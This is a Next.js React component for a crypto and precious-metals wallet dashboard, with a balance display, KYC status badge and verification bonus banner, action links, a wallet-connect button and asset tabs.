"use client";

import { useState } from "react";
import { Search, Eye, EyeOff, ArrowUp, ArrowDown, CreditCard, ArrowLeftRight, Check, ChevronDown, ArrowRight, Gift } from "lucide-react";
import Link from "next/link";
import CryptoCoins from "@/components/crypto-coins";
import PreciousMetals from "@/components/precious-metals";
import { User } from "@/lib/auth";
import { useRouter } from "next/navigation";
import { Button, buttonVariants } from "../ui/button";
import { Badge } from "../ui/badge";
import { cn } from "@/lib/utils";
import { PRECIOUS_METALS, METAL_PRICES } from "@/constants";

function DashboardClient({ coinData, user }: { coinData: CryptoData[], user: User }) {
  const [searchQuery, setSearchQuery] = useState("");
  const [balanceShow, setBalanceShow] = useState(true);
  const [tab, setTab] = useState<"assets" | "metals">("assets");

  const router = useRouter();

  const userCoins = JSON.parse(user.coins) as UserCoin;

  const metalData: CryptoData[] = PRECIOUS_METALS.map((metal) => ({
    ...metal,
    balance: Number(userCoins[metal.symbol as keyof UserCoin]?.balance || 0),
    price: METAL_PRICES[metal.symbol] || 0,
    change24h: 0,
    volume_24h: 0,
    market_cap: 0
  }));

  const totalMetalsBalance = metalData.reduce((sum, metal) => sum + metal.balance * metal.price, 0);
  const totalCryptoBalance = coinData.reduce((sum, coin) => sum + coin.balance * coin.price, 0);

  const totalBalance = totalCryptoBalance + totalMetalsBalance;

  const balance = totalBalance.toLocaleString(undefined, {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });

  const kycStatus = user.kyc.status;
  const filteredCoinData = coinData.filter((coin) => coin.name.toLowerCase().includes(searchQuery.toLowerCase()) || coin.symbol.toLowerCase().includes(searchQuery.toLowerCase()) || coin.network?.toLowerCase().includes(searchQuery.toLowerCase()));

  const filteredMetalData = metalData.filter((coin) => coin.name.toLowerCase().includes(searchQuery.toLowerCase()) || coin.symbol.toLowerCase().includes(searchQuery.toLowerCase()));

  return (
    <main className="p-2 px-4 pb-24 md:pb-4">
      {/* Search Bar */}
      <div className="relative">
        <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
        <input
          type="text"
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          placeholder="Search"
          className="w-full bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-700 rounded-md pl-10 pr-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
        />
      </div>

      {/* Account Name with Dropdown */}
      <div className="mt-6">
        <div className="flex justify-between items-center sm:justify-start sm:space-x-4">
          <button className="flex items-center space-x-2 hover:text-gray-700 dark:hover:text-gray-300 transition-colors">
            <span className="text-lg font-semibold truncate max-w-[150px] sm:max-w-xs">
              {user.name}
            </span>
            <ChevronDown className="text-sm w-4 h-4" />
          </button>

          <Badge
            variant={
              kycStatus === "approved" ? "approved" :
                kycStatus === "pending" ? "pending" :
                  kycStatus === "rejected" ? "rejected" : "secondary"
            }
            className="capitalize"
          >
            {kycStatus === "none" ? "Unverified" : kycStatus}
          </Badge>
        </div>

        {(kycStatus === "none" || kycStatus === "rejected") && (
          <div className="mt-4 p-4 rounded-xl bg-linear-to-r from-blue-50 to-indigo-50 dark:from-blue-950/20 dark:to-indigo-950/20 border border-blue-100 dark:border-blue-900/30 relative overflow-hidden group">
            <div className="relative z-10 flex items-center justify-between gap-3">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <h3 className="text-sm font-semibold text-blue-900 dark:text-blue-100">
                    {kycStatus === "rejected" ? "Verification Failed" : "Verify Your Identity"}
                  </h3>
                  <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-bold bg-amber-500/20 text-amber-700 dark:text-amber-300 border border-amber-500/30">
                    <Gift className="w-3 h-3" />
                    +5 USDT Bonus
                  </span>
                </div>
                <p className="text-xs text-blue-700 dark:text-blue-300 mt-1">
                  {kycStatus === "rejected"
                    ? "Please update your documents to remove limits and claim your 5 USDT reward."
                    : "Verify your identity to get a $5 USDT bonus credited to your balance and unlock higher limits."}
                </p>
              </div>
              <Link
                href="/kyc"
                className={buttonVariants({ variant: "default", size: "sm" })}
              >
                {kycStatus === "rejected" ? "Retry" : "Claim $5"}
                <ArrowRight className="w-3 h-3 ml-1" />
              </Link>
            </div>
          </div>
        )}
      </div>

      {/* Balance Display */}
      <div className="mt-6 flex items-center justify-between">
        <div className="text-3xl md:text-4xl font-bold">
          {balanceShow ? `$${balance}` : "••••••••"}
        </div>
        <button
          onClick={() => setBalanceShow(!balanceShow)}
          className="text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white"
        >
          {balanceShow ? (
            <Eye className="text-xl w-5 h-5" />
          ) : (
            <EyeOff className="text-xl w-5 h-5" />
          )}
        </button>
      </div>

      {/* Action Buttons */}
      <div className="mt-8 grid grid-cols-4 gap-2 sm:gap-4">
        <div className="flex flex-col items-center">
          <Link
            href="/withdraw"
            className="h-12 w-12 sm:h-16 sm:w-16 rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 flex items-center justify-center"
          >
            <ArrowUp className="text-xl w-5 h-5" />
          </Link>
          <span className="mt-2 text-xs sm:text-sm">Withdraw</span>
        </div>
        <div className="flex flex-col items-center">
          <Link
            href="/deposit"
            className="h-12 w-12 sm:h-16 sm:w-16 rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 flex items-center justify-center"
          >
            <ArrowDown className="text-xl w-5 h-5" />
          </Link>
          <span className="mt-2 text-xs sm:text-sm">Deposit</span>
        </div>
        <div className="flex flex-col items-center">
          <Link
            href="/buy"
            className="h-12 w-12 sm:h-16 sm:w-16 rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 flex items-center justify-center"
          >
            <CreditCard className="text-xl w-5 h-5" />
          </Link>
          <span className="mt-2 text-xs sm:text-sm">Buy</span>
        </div>
        <div className="flex flex-col items-center">
          <Link
            href="/swap"
            className="h-12 w-12 sm:h-16 sm:w-16 rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 flex items-center justify-center"
          >
            <ArrowLeftRight className="text-xl w-5 h-5" />
          </Link>
          <span className="mt-2 text-xs sm:text-sm">Swap</span>
        </div>
      </div>

      {/* Help Text */}
      <div className="mt-6 text-center text-gray-600 dark:text-gray-400">
        Access, secure and withdraw assets
      </div>

      {/* Connect Wallet Button */}
      <Button
        onClick={() => user.walletStatus === "not-connected" ? router.push("/connect-wallet") : null}
        className={user.walletStatus === "connected"
          ? "mt-3 w-full bg-green-500 text-black dark:text-white font-bold py-3 rounded-md flex items-center justify-center"
          : user.walletStatus === "pending"
            ? "mt-3 w-full bg-blue-500 text-white font-bold py-3 rounded-md flex items-center justify-center cursor-wait opacity-90"
            : "mt-3 w-full bg-yellow-500 text-black font-bold py-3 rounded-md hover:bg-yellow-600 flex items-center justify-center"
        }
        disabled={user.walletStatus !== "not-connected"}
      >
        {user.walletStatus === "connected" ? (
          <>
            <Check className="mr-2 w-4 h-4" />
            Wallet Connected
          </>
        ) : user.walletStatus === "pending" ? (
          "Pending"
        ) : (
          "Connect Wallet"
        )}
      </Button>

      {/* Assets */}
      <div className="mt-8">
        <div className="flex items-center gap-4 mb-4">
          <button
            type="button"
            onClick={() => setTab("assets")}
            className={cn(
              "text-xs font-bold py-2 px-4 rounded-md transition-colors",
              tab === "assets"
                ? "bg-blue-500 text-white"
                : "bg-gray-200 dark:bg-gray-800 text-gray-500 dark:text-gray-400 hover:bg-gray-300 dark:hover:bg-gray-700"
            )}
          >
            Assets
          </button>
          <button
            type="button"
            onClick={() => setTab("metals")}
            className={cn(
              "text-xs font-bold py-2 px-4 rounded-md transition-colors",
              tab === "metals"
                ? "bg-blue-500 text-white"
                : "bg-gray-200 dark:bg-gray-800 text-gray-500 dark:text-gray-400 hover:bg-gray-300 dark:hover:bg-gray-700"
            )}
          >
            Precious Metals
          </button>
        </div>

        {tab === "assets"
          ? <CryptoCoins coinData={filteredCoinData} page="dashboard" />
          : <PreciousMetals metalData={filteredMetalData} page="dashboard" />
        }
      </div>
    </main>
  );
}

export default DashboardClient
